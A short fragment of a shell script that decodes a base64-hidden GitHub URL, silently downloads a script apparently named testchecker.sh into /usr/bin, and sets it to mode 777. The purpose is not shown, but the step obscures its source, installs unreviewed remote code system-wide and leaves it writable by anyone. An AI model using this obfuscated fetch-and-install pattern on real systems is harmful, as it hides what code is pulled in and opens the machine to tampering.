...
wget -q $(echo "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ptZWRpbmFyL3Rlc3RjaGVja2VyL21haW4vdGVzdGNoZWNrZXIuc2gK" | base64 -d) -P /usr/bin/
chmod 777 /usr/bin/testchecker.sh
